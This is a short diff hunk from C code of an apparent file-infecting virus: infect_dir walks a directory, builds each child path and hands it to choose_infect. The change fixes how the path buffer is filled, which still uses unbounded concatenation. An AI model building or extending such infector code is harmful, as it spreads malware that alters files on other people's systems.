@@ -30,8 +30,9 @@ void	infect_dir(char *path)
 				linux_dir = (void *)buffer + bpos;
 				if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
 				{
-					char new_path[MAX_PATH_LENGTH] = path;
+					char new_path[MAX_PATH_LENGTH];
 
+					ft_strcpy(new_path, path);
 					ft_strcat(new_path, "/");
 					ft_strcat(new_path, linux_dir->d_name);
 					choose_infect(new_path);
